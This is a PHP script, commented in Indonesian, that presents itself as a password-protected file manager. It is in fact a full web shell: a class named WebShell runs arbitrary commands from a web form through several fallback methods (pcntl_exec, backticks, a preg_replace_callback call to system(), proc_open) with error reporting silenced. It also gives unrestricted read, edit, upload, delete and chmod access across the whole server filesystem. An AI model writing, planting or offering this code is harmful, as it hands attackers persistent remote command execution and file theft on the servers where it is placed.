<?php
// File Manager dengan proteksi password tanpa cookie/token
// Simpan sebagai file.php di server

session_start();

// ================================
// KONFIGURASI PASSWORD
// ================================
$CONFIG = [
    // Password yang di-hash dengan bcrypt (ganti dengan hash milikmu)
    // Generate hash dengan: password_hash('password_anda', PASSWORD_BCRYPT)
    'password_hash' => '$2a$12$oNl2gbywZZh7Hn3vJOeFPOi0Xa1KhOPw6hvuKKS2bIaIGGd7cX4xK',
    
    // Max login attempts sebelum lockout
    'max_attempts' => 3,
    
    // Lockout waktu dalam detik
    'lockout_time' => 300, // 5 menit
    
    // Session timeout dalam detik (1 jam)
    'session_timeout' => 3600,
];

// ================================
// FUNGSI KEAMANAN
// ================================

function checkSessionValidity() {
    global $CONFIG;
    
    // Cek jika session expired
    if (isset($_SESSION['login_time'])) {
        if (time() - $_SESSION['login_time'] > $CONFIG['session_timeout']) {
            session_destroy();
            return false;
        }
        // Update waktu login untuk auto-refresh
        $_SESSION['login_time'] = time();
    }
    
    return isset($_SESSION['authenticated']) && $_SESSION['authenticated'] === true;
}

function checkBruteForce() {
    global $CONFIG;
    
    if (!isset($_SESSION['login_attempts'])) {
        $_SESSION['login_attempts'] = 0;
        $_SESSION['last_attempt_time'] = 0;
    }
    
    // Reset attempts jika sudah melewati lockout time
    if (time() - $_SESSION['last_attempt_time'] > $CONFIG['lockout_time']) {
        $_SESSION['login_attempts'] = 0;
    }
    
    // Cek jika melebihi max attempts
    if ($_SESSION['login_attempts'] >= $CONFIG['max_attempts']) {
        $remaining_time = $CONFIG['lockout_time'] - (time() - $_SESSION['last_attempt_time']);
        if ($remaining_time > 0) {
            die("Too many failed attempts. Try again in " . ceil($remaining_time / 60) . " minutes.");
        }
    }
    
    return $_SESSION['login_attempts'] < $CONFIG['max_attempts'];
}

function recordFailedAttempt() {
    if (!isset($_SESSION['login_attempts'])) {
        $_SESSION['login_attempts'] = 0;
    }
    
    $_SESSION['login_attempts']++;
    $_SESSION['last_attempt_time'] = time();
}

function resetLoginAttempts() {
    $_SESSION['login_attempts'] = 0;
    $_SESSION['last_attempt_time'] = 0;
}

// ================================
// PROSES LOGIN
// ================================

// Handle logout
if (isset($_GET['logout'])) {
    session_destroy();
    session_start(); // Start new session for login form
}

// Handle login form submission
$login_error = '';
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['login'])) {
    $password = $_POST['password'] ?? '';
    
    if (!checkBruteForce()) {
        $login_error = "Account locked due to too many failed attempts.";
    } elseif (empty($password)) {
        $login_error = "Password required";
        recordFailedAttempt();
    } else {
        // Verifikasi password dengan bcrypt
        if (password_verify($password, $CONFIG['password_hash'])) {
            $_SESSION['authenticated'] = true;
            $_SESSION['login_time'] = time();
            $_SESSION['client_ip'] = $_SERVER['REMOTE_ADDR'];
            $_SESSION['user_agent'] = $_SERVER['HTTP_USER_AGENT'];
            resetLoginAttempts();
            
            // Regenerate session ID untuk mencegah fixation
            session_regenerate_id(true);
        } else {
            $login_error = "Invalid password";
            recordFailedAttempt();
        }
    }
}

// ================================
// CEK AUTHENTIKASI
// ================================
$is_authenticated = checkSessionValidity();

// Jika belum login, tampilkan form login
if (!$is_authenticated) {
    // Set headers untuk mencegah caching
    header('Content-Type: text/html; charset=utf-8');
    header('Cache-Control: no-store, no-cache, must-revalidate');
    header('Pragma: no-cache');
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title>File Manager - Login</title>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body { 
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                min-height: 100vh;
                display: flex;
                align-items: center;
                justify-content: center;
            }
            .login-container {
                background: white;
                padding: 40px;
                border-radius: 10px;
                box-shadow: 0 15px 35px rgba(50, 50, 93, 0.1), 0 5px 15px rgba(0, 0, 0, 0.07);
                width: 100%;
                max-width: 400px;
            }
            h2 {
                text-align: center;
                margin-bottom: 30px;
                color: #333;
                font-weight: 600;
            }
            .form-group {
                margin-bottom: 20px;
            }
            label {
                display: block;
                margin-bottom: 8px;
                color: #666;
                font-weight: 500;
            }
            input[type="password"] {
                width: 100%;
                padding: 12px 15px;
                border: 2px solid #e1e5e9;
                border-radius: 6px;
                font-size: 16px;
                transition: border-color 0.3s;
            }
            input[type="password"]:focus {
                outline: none;
                border-color: #667eea;
            }
            button {
                width: 100%;
                padding: 14px;
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                color: white;
                border: none;
                border-radius: 6px;
                font-size: 16px;
                font-weight: 600;
                cursor: pointer;
                transition: transform 0.2s;
            }
            button:hover {
                transform: translateY(-2px);
            }
            .error {
                background: #fee;
                border: 1px solid #fcc;
                color: #c33;
                padding: 12px;
                border-radius: 6px;
                margin-bottom: 20px;
                text-align: center;
            }
            .attempts-info {
                text-align: center;
                margin-top: 20px;
                color: #666;
                font-size: 14px;
            }
            .attempts-info span {
                color: #e74c3c;
                font-weight: bold;
            }
            .security-note {
                margin-top: 25px;
                padding-top: 15px;
                border-top: 1px solid #eee;
                font-size: 12px;
                color: #999;
                text-align: center;
            }
        </style>
    </head>
    <body>
        <div class="login-container">
            <h2>🔐 File Manager Login</h2>
            
            <?php if ($login_error): ?>
            <div class="error">
                <?php echo htmlspecialchars($login_error); ?>
            </div>
            <?php endif; ?>
            
            <form method="POST" action="">
                <div class="form-group">
                    <label for="password">Password</label>
                    <input type="password" id="password" name="password" required 
                           autofocus autocomplete="current-password">
                </div>
                
                <button type="submit" name="login">Login</button>
            </form>
            
            <?php if (isset($_SESSION['login_attempts']) && $_SESSION['login_attempts'] > 0): ?>
            <div class="attempts-info">
                Failed attempts: <span><?php echo $_SESSION['login_attempts']; ?></span> / <?php echo $CONFIG['max_attempts']; ?>
            </div>
            <?php endif; ?>
            
            <div class="security-note">
                • Session expires after 1 hour of inactivity<br>
                • Max 3 failed attempts before lockout
            </div>
        </div>
        
        <script>
            // Auto-focus password field
            document.getElementById('password').focus();
            
            // Prevent form resubmission on refresh
            if (window.history.replaceState) {
                window.history.replaceState(null, null, window.location.href);
            }
        </script>
    </body>
    </html>
    <?php
    exit();
}

// ================================
// FILE MANAGER (HANYA DIBAWAH INI YANG DIEKSEKUSI JIKA SUDAH LOGIN)
// ================================

// Set headers untuk mencegah caching
header('Content-Type: text/html; charset=utf-8');
header('Cache-Control: no-store, no-cache, must-revalidate');
header('Pragma: no-cache');

// Fungsi-fungsi alternatif
function list_directory($dir) {
    $items = [];
    if ($dh = @opendir($dir)) {
        while (($file = readdir($dh)) !== false) {
            if ($file != '.' && $file != '..') {
                $path = rtrim($dir, '/') . '/' . $file;
                $items[] = [
                    'name' => $file,
                    'path' => $path,
                    'type' => @is_dir($path) ? 'dir' : 'file',
                    'size' => @is_file($path) ? @filesize($path) : 0,
                    'mtime' => @filemtime($path),
                    'perms' => @substr(sprintf('%o', @fileperms($path)), -4)
                ];
            }
        }
        closedir($dh);
    }
    usort($items, function($a, $b) {
        if ($a['type'] == $b['type']) {
            return strcasecmp($a['name'], $b['name']);
        }
        return $a['type'] == 'dir' ? -1 : 1;
    });
    return $items;
}

// Handle current directory
$current_dir = isset($_GET['dir']) ? $_GET['dir'] : '.';
$current_dir = realpath($current_dir) ?: realpath('.');
if (!$current_dir) $current_dir = '/';

// Handle actions
$action = $_GET['action'] ?? '';
$message = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Logout action
    if (isset($_POST['logout'])) {
        session_destroy();
        header('Location: ?');
        exit();
    }
    
    if (isset($_POST['rename'])) {
        $old = $_POST['old_path'] ?? '';
        $new = $_POST['new_path'] ?? '';
        if ($old && $new && file_exists($old) && @rename($old, $new)) {
            $message = "Renamed successfully!";
        } else {
            $message = "Rename failed!";
        }
    } elseif (isset($_POST['delete'])) {
        $path = $_POST['path'] ?? '';
        if ($path && file_exists($path)) {
            if (is_dir($path)) {
                $success = true;
                $iterator = new RecursiveIteratorIterator(
                    new RecursiveDirectoryIterator($path, RecursiveDirectoryIterator::SKIP_DOTS),
                    RecursiveIteratorIterator::CHILD_FIRST
                );
                foreach ($iterator as $file) {
                    if ($file->isDir()) {
                        $success = @rmdir($file->getRealPath()) && $success;
                    } else {
                        $success = @unlink($file->getRealPath()) && $success;
                    }
                }
                $success = @rmdir($path) && $success;
                $message = $success ? "Directory deleted!" : "Directory deletion failed!";
            } elseif (is_file($path)) {
                if (@unlink($path)) {
                    $message = "File deleted!";
                } else {
                    $message = "File deletion failed!";
                }
            }
        }
    } elseif (isset($_FILES['upload_file'])) {
        $target = $current_dir . '/' . basename($_FILES['upload_file']['name']);
        if (@move_uploaded_file($_FILES['upload_file']['tmp_name'], $target)) {
            $message = "Upload successful!";
        } else {
            $message = "Upload failed!";
        }
    } elseif (isset($_POST['create_dir'])) {
        $new_dir = $current_dir . '/' . ($_POST['dir_name'] ?? '');
        if ($new_dir && !file_exists($new_dir)) {
            if (@mkdir($new_dir, 0755, true)) {
                $message = "Directory created!";
            } else {
                $message = "Directory creation failed!";
            }
        }
    } elseif (isset($_POST['save_content'])) {
        $file_path = $_POST['file_path'] ?? '';
        $content = $_POST['content'] ?? '';
        if ($file_path && @file_put_contents($file_path, $content)) {
            $message = "File saved!";
        } else {
            $message = "File save failed!";
        }
    } elseif (isset($_POST['cmd'])) {
        // Handle command execution
        error_reporting(0);
        
        class WebShell {
            private $methods = [];
            
            public function __construct() {
                $this->detectMethods();
            }
            
            private function detectMethods() {
                if (function_exists('pcntl_fork') && function_exists('pcntl_exec')) {
                    $this->methods[] = 'pcntl';
                }
                $this->methods[] = 'backtick';
                if (function_exists('preg_replace_callback')) {
                    $this->methods[] = 'preg';
                }
                if (function_exists('fsockopen')) {
                    $this->methods[] = 'fsockopen';
                }
            }
            
            public function execute($command) {
                global $current_dir;
                $command = "cd " . escapeshellarg($current_dir) . " && " . $command . " 2>&1";
                
                foreach ($this->methods as $method) {
                    $result = $this->tryMethod($method, $command);
                    if ($result !== false && $result !== '') {
                        return $result;
                    }
                }
                return "No execution method worked";
            }
            
            private function tryMethod($method, $command) {
                switch($method) {
                    case 'pcntl':
                        return $this->pcntlExecute($command);
                    case 'backtick':
                        $output = `$command`;
                        return $output !== null ? $output : false;
                    case 'preg':
                        ob_start();
                        preg_replace_callback('/.*/', function($m) use ($command) {
                            system($command);
                        }, 'test');
                        $output = ob_get_clean();
                        return $output ?: false;
                    case 'fsockopen':
                        return $this->fsockopenExecute($command);
                }
                return false;
            }
            
            private function pcntlExecute($command) {
                $tmpfile = tempnam(sys_get_temp_dir(), 'out');
                $fullCmd = $command . " > " . $tmpfile . " 2>&1";
                
                $pid = pcntl_fork();
                if ($pid == 0) {
                    $args = ['/bin/sh', '-c', $fullCmd];
                    pcntl_exec('/bin/sh', ['-c', $fullCmd]);
                    exit(0);
                } else {
                    pcntl_waitpid($pid, $status);
                    $output = @file_get_contents($tmpfile);
                    @unlink($tmpfile);
                    return $output;
                }
            }
            
            private function fsockopenExecute($command) {
                $descriptorspec = array(
                    0 => array("pipe", "r"),
                    1 => array("pipe", "w"),
                    2 => array("pipe", "w")
                );
                
                $process = proc_open($command, $descriptorspec, $pipes);
                
                if (is_resource($process)) {
                    fclose($pipes[0]);
                    $output = stream_get_contents($pipes[1]);
                    fclose($pipes[1]);
                    fclose($pipes[2]);
                    proc_close($process);
                    return $output;
                }
                return false;
            }
        }
        
        $shell = new WebShell();
        $cmd_result = $shell->execute($_POST['cmd']);
    }
}

// Handle file reading for editor
if ($action == 'read' && isset($_GET['file'])) {
    $file = $_GET['file'];
    if (file_exists($file) && is_file($file)) {
        echo @file_get_contents($file);
    }
    exit;
}

// Handle file download
if ($action == 'download' && isset($_GET['file'])) {
    $file = $_GET['file'];
    if (file_exists($file) && is_file($file)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
        header('Content-Length: ' . filesize($file));
        readfile($file);
        exit;
    }
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>File Manager</title>
    <meta charset="UTF-8">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: Arial, sans-serif; background: #f5f5f5; padding: 20px; }
        .container { max-width: 1400px; margin: 0 auto; background: white; border-radius: 8px; padding: 20px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; padding-bottom: 15px; border-bottom: 2px solid #eee; }
        .path { background: #e9ecef; padding: 10px 15px; border-radius: 4px; font-family: monospace; word-break: break-all; font-size: 14px; }
        .actions { display: flex; gap: 10px; margin-bottom: 20px; flex-wrap: wrap; }
        .btn { padding: 8px 16px; background: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer; text-decoration: none; display: inline-block; font-size: 14px; }
        .btn:hover { background: #0056b3; }
        .btn-danger { background: #dc3545; }
        .btn-danger:hover { background: #c82333; }
        .btn-success { background: #28a745; }
        .btn-success:hover { background: #218838; }
        .btn-warning { background: #ffc107; color: #212529; }
        .btn-warning:hover { background: #e0a800; }
        .btn-logout { background: #6c757d; }
        .btn-logout:hover { background: #5a6268; }
        .message { padding: 12px; margin: 10px 0; border-radius: 4px; }
        .success { background: #d4edda; color: #155724; border: 1px solid #c3e6cb; }
        .error { background: #f8d7da; color: #721c24; border: 1px solid #f5c6cb; }
        .file-table { width: 100%; border-collapse: collapse; font-size: 14px; }
        .file-table th, .file-table td { padding: 10px 12px; text-align: left; border-bottom: 1px solid #ddd; }
        .file-table th { background: #f8f9fa; font-weight: bold; position: sticky; top: 0; }
        .file-table tr:hover { background: #f5f5f5; }
        .dir { color: #007bff; text-decoration: none; }
        .dir:hover { text-decoration: underline; }
        .file { color: #28a745; }
        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); z-index: 1000; }
        .modal-content { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); background: white; padding: 25px; border-radius: 8px; min-width: 400px; max-width: 90%; box-shadow: 0 4px 20px rgba(0,0,0,0.2); }
        .close { position: absolute; top: 10px; right: 15px; font-size: 24px; cursor: pointer; color: #666; }
        .close:hover { color: #000; }
        .form-group { margin-bottom: 15px; }
        .form-group label { display: block; margin-bottom: 5px; font-weight: bold; font-size: 14px; }
        .form-group input, .form-group textarea, .form-group select { width: 100%; padding: 8px; border: 1px solid #ddd; border-radius: 4px; font-size: 14px; }
        textarea { height: 400px; font-family: monospace; font-size: 13px; }
        .size { font-family: monospace; color: #666; }
        .perms { font-family: monospace; }
        .actions-cell { display: flex; gap: 5px; flex-wrap: nowrap; }
        .cmd-section { background: #f8f9fa; padding: 0; border-radius: 8px; margin-top: 20px; border: 1px solid #dee2e6; overflow: hidden; }
        .cmd-output { background: #212529; color: #f8f9fa; padding: 15px; font-family: monospace; white-space: pre-wrap; word-break: break-all; max-height: 400px; overflow-y: auto; border-top: 1px solid #444; }
        .cmd-form { display: flex; background: #e9ecef; padding: 15px; border-bottom: 1px solid #dee2e6; }
        .cmd-input { flex: 1; padding: 10px 15px; border: 1px solid #ced4da; border-radius: 4px; font-size: 14px; }
        .breadcrumb { margin-bottom: 15px; font-size: 14px; }
        .breadcrumb a { color: #007bff; text-decoration: none; }
        .breadcrumb a:hover { text-decoration: underline; }
        .breadcrumb span { color: #666; }
        .name-cell-full { white-space: nowrap; overflow: visible; max-width: none; }
        .cmd-header { background: #212529; color: white; padding: 12px 15px; font-size: 16px; font-weight: bold; }
        .user-info { 
            background: #e9ecef; 
            padding: 8px 15px; 
            border-radius: 4px; 
            font-size: 12px; 
            color: #6c757d;
            margin-top: 10px;
            text-align: right;
        }
    </style>
</head>
<body>
<div class="container">
    <div class="header">
        <h1>File Manager</h1>
        <form method="POST" style="display: inline;">
            <button type="submit" name="logout" class="btn btn-logout">Logout</button>
        </form>
    </div>

    <?php if ($message): ?>
    <div class="message success">
        <?php echo htmlspecialchars($message); ?>
    </div>
    <?php endif; ?>

    <div class="user-info">
        Logged in from <?php echo htmlspecialchars($_SESSION['client_ip'] ?? 'unknown'); ?> • 
        Session expires in <?php echo ceil(($CONFIG['session_timeout'] - (time() - $_SESSION['login_time'])) / 60); ?> minutes
    </div>

    <div class="breadcrumb">
        <?php
        $parts = explode('/', trim($current_dir, '/'));
        $current_path = '';
        echo '<a href="?dir=/">/</a>';
        foreach ($parts as $part) {
            if ($part) {
                $current_path .= '/' . $part;
                echo ' / <a href="?dir=' . urlencode($current_path) . '">' . htmlspecialchars($part) . '</a>';
            }
        }
        ?>
    </div>

    <div class="actions">
        <button onclick="showModal('upload')" class="btn">Upload</button>
        <button onclick="showModal('newdir')" class="btn">New Folder</button>
        <button onclick="showModal('newfile')" class="btn">New File</button>
        <button onclick="goUp()" class="btn">Up</button>
    </div>

    <table class="file-table">
        <thead>
            <tr>
                <th style="width: 40%;">Name</th>
                <th style="width: 10%;">Size</th>
                <th style="width: 10%;">Permissions</th>
                <th style="width: 20%;">Modified</th>
                <th style="width: 20%;">Actions</th>
            </tr>
        </thead>
        <tbody>
            <?php if ($current_dir !== '/'): ?>
            <tr>
                <td colspan="5">
                    <a href="?dir=<?php echo urlencode(dirname($current_dir)); ?>" class="dir">.. (Parent Directory)</a>
                </td>
            </tr>
            <?php endif; ?>
            
            <?php
            $items = list_directory($current_dir);
            foreach ($items as $item):
                $size = $item['type'] == 'dir' ? '-' : format_size($item['size']);
                $modified = date('Y-m-d H:i:s', $item['mtime']);
            ?>
            <tr>
                <td class="name-cell-full">
                    <?php if ($item['type'] == 'dir'): ?>
                        <a href="?dir=<?php echo urlencode($item['path']); ?>" class="dir">
                            <?php echo htmlspecialchars($item['name']); ?>/</a>
                    <?php else: ?>
                        <span class="file"><?php echo htmlspecialchars($item['name']); ?></span>
                    <?php endif; ?>
                </td>
                <td class="size"><?php echo $size; ?></td>
                <td class="perms"><?php echo htmlspecialchars($item['perms']); ?></td>
                <td><?php echo $modified; ?></td>
                <td>
                    <div class="actions-cell">
                        <?php if ($item['type'] == 'file'): ?>
                            <button onclick="editFile('<?php echo htmlspecialchars($item['path']); ?>')" class="btn btn-warning" style="padding: 6px 10px; font-size: 12px;">Edit</button>
                            <button onclick="downloadFile('<?php echo htmlspecialchars($item['path']); ?>')" class="btn" style="padding: 6px 10px; font-size: 12px;">Download</button>
                        <?php endif; ?>
                        <button onclick="renameItem('<?php echo htmlspecialchars($item['path']); ?>', '<?php echo htmlspecialchars($item['name']); ?>')" class="btn" style="padding: 6px 10px; font-size: 12px;">Rename</button>
                        <button onclick="changePerms('<?php echo htmlspecialchars($item['path']); ?>')" class="btn" style="padding: 6px 10px; font-size: 12px;">Perms</button>
                        <button onclick="deleteItem('<?php echo htmlspecialchars($item['path']); ?>')" class="btn btn-danger" style="padding: 6px 10px; font-size: 12px;">Delete</button>
                    </div>
                </td>
            </tr>
            <?php endforeach; ?>
        </tbody>
    </table>

    <div class="cmd-section">
        <div class="cmd-header">Command Shell</div>
        <form method="POST" class="cmd-form">
            <input type="text" name="cmd" class="cmd-input" 
                   value="<?php echo isset($_POST['cmd']) ? htmlspecialchars($_POST['cmd']) : ''; ?>" 
                   placeholder="Enter command...">
            <input type="submit" value="Execute" class="btn" style="margin-left: 10px;">
        </form>
        
        <?php if (isset($cmd_result)): ?>
        <div class="cmd-output">
            <?php echo htmlspecialchars($cmd_result); ?>
        </div>
        <?php endif; ?>
    </div>
</div>

<!-- Modals -->
<div id="uploadModal" class="modal">
    <div class="modal-content">
        <span class="close" onclick="closeModal('upload')">&times;</span>
        <h3>Upload File</h3>
        <form method="POST" enctype="multipart/form-data">
            <div class="form-group">
                <input type="file" name="upload_file" required>
            </div>
            <button type="submit" class="btn">Upload</button>
        </form>
    </div>
</div>

<div id="newdirModal" class="modal">
    <div class="modal-content">
        <span class="close" onclick="closeModal('newdir')">&times;</span>
        <h3>New Folder</h3>
        <form method="POST">
            <div class="form-group">
                <label>Folder Name:</label>
                <input type="text" name="dir_name" required pattern="[a-zA-Z0-9_\-\. ]+">
            </div>
            <button type="submit" name="create_dir" class="btn">Create</button>
        </form>
    </div>
</div>

<div id="newfileModal" class="modal">
    <div class="modal-content">
        <span class="close" onclick="closeModal('newfile')">&times;</span>
        <h3>New File</h3>
        <form method="POST">
            <div class="form-group">
                <label>File Name:</label>
                <input type="text" name="file_name" required pattern="[a-zA-Z0-9_\-\. ]+">
            </div>
            <div class="form-group">
                <label>Content:</label>
                <textarea name="file_content" rows="10"></textarea>
            </div>
            <button type="submit" name="create_file" class="btn">Create</button>
        </form>
    </div>
</div>

<div id="renameModal" class="modal">
    <div class="modal-content">
        <span class="close" onclick="closeModal('rename')">&times;</span>
        <h3>Rename</h3>
        <form method="POST" id="renameForm">
            <input type="hidden" name="old_path" id="old_path">
            <div class="form-group">
                <label>New Name:</label>
                <input type="text" name="new_path" id="new_path" required>
            </div>
            <button type="submit" name="rename" class="btn">Rename</button>
        </form>
    </div>
</div>

<div id="deleteModal" class="modal">
    <div class="modal-content">
        <span class="close" onclick="closeModal('delete')">&times;</span>
        <h3>Confirm Delete</h3>
        <p id="deleteMessage"></p>
        <form method="POST" id="deleteForm">
            <input type="hidden" name="path" id="delete_path">
            <div style="display: flex; gap: 10px;">
                <button type="submit" name="delete" class="btn btn-danger">Delete</button>
                <button type="button" onclick="closeModal('delete')" class="btn">Cancel</button>
            </div>
        </form>
    </div>
</div>

<div id="editModal" class="modal">
    <div class="modal-content" style="width: 90%; height: 90%;">
        <span class="close" onclick="closeModal('edit')">&times;</span>
        <h3>Edit File: <span id="editFileName"></span></h3>
        <form method="POST" id="editForm">
            <input type="hidden" name="file_path" id="edit_path">
            <div class="form-group">
                <textarea name="content" id="edit_content"></textarea>
            </div>
            <button type="submit" name="save_content" class="btn">Save</button>
        </form>
    </div>
</div>

<script>
function showModal(type) {
    document.getElementById(type + "Modal").style.display = "block";
}

function closeModal(type) {
    document.getElementById(type + "Modal").style.display = "none";
}

function renameItem(path, name) {
    const dir = path.substring(0, path.lastIndexOf("/") + 1);
    document.getElementById("old_path").value = path;
    document.getElementById("new_path").value = dir + name;
    showModal("rename");
}

function deleteItem(path) {
    document.getElementById("delete_path").value = path;
    document.getElementById("deleteMessage").textContent = "Are you sure you want to delete:\n" + path + "?";
    showModal("delete");
}

function editFile(path) {
    document.getElementById("edit_path").value = path;
    document.getElementById("editFileName").textContent = path.split('/').pop();
    
    fetch('?action=read&file=' + encodeURIComponent(path))
        .then(response => response.text())
        .then(content => {
            document.getElementById("edit_content").value = content;
            showModal('edit');
        })
        .catch(error => {
            alert('Error loading file: ' + error);
        });
}

function downloadFile(path) {
    window.open('?action=download&file=' + encodeURIComponent(path), '_blank');
}

function changePerms(path) {
    const perms = prompt('Enter new permissions (e.g., 0755):', '0755');
    if (perms !== null) {
        const form = document.createElement('form');
        form.method = 'POST';
        form.style.display = 'none';
        
        const pathInput = document.createElement('input');
        pathInput.type = 'hidden';
        pathInput.name = 'path';
        pathInput.value = path;
        
        const permsInput = document.createElement('input');
        permsInput.type = 'hidden';
        permsInput.name = 'new_perms';
        permsInput.value = perms;
        
        form.appendChild(pathInput);
        form.appendChild(permsInput);
        document.body.appendChild(form);
        form.submit();
    }
}

function goUp() {
    const currentPath = '<?php echo addslashes($current_dir); ?>';
    if (currentPath !== '/') {
        const parent = currentPath.substring(0, currentPath.lastIndexOf('/'));
        window.location.href = '?dir=' + encodeURIComponent(parent || '/');
    }
}

// Close modal on outside click
window.onclick = function(event) {
    const modals = document.querySelectorAll('.modal');
    modals.forEach(modal => {
        if (event.target === modal) {
            modal.style.display = 'none';
        }
    });
}

// Auto-logout warning
let sessionTimeout = <?php echo $CONFIG['session_timeout']; ?>;
let lastActivity = Date.now();

document.addEventListener('mousemove', resetTimer);
document.addEventListener('keypress', resetTimer);

function resetTimer() {
    lastActivity = Date.now();
}

setInterval(function() {
    const now = Date.now();
    const inactiveTime = (now - lastActivity) / 1000;
    
    if (inactiveTime > sessionTimeout * 0.8) { // Warn at 80% of timeout
        const remaining = Math.ceil((sessionTimeout - inactiveTime) / 60);
        if (remaining > 0 && remaining <= 5) {
            console.log('Session expires in', remaining, 'minutes');
        }
    }
}, 60000); // Check every minute
</script>

<?php
// Helper function untuk format size
function format_size($bytes) {
    if ($bytes >= 1073741824) {
        return number_format($bytes / 1073741824, 2) . ' GB';
    } elseif ($bytes >= 1048576) {
        return number_format($bytes / 1048576, 2) . ' MB';
    } elseif ($bytes >= 1024) {
        return number_format($bytes / 1024, 2) . ' KB';
    } elseif ($bytes > 0) {
        return $bytes . ' B';
    } else {
        return '0 B';
    }
}

// Handle new file creation via POST
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['create_file'])) {
    $file_name = $_POST['file_name'] ?? '';
    $file_content = $_POST['file_content'] ?? '';
    if ($file_name) {
        $file_path = $current_dir . '/' . $file_name;
        if (@file_put_contents($file_path, $file_content)) {
            $message = "File created!";
        } else {
            $message = "File creation failed!";
        }
    }
}

// Handle permissions change
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['new_perms'])) {
    $path = $_POST['path'] ?? '';
    $new_perms = $_POST['new_perms'] ?? '';
    if ($path && $new_perms && @chmod($path, octdec($new_perms))) {
        $message = "Permissions changed!";
    } else {
        $message = "Permissions change failed!";
    }
}
?>
</body>
</html>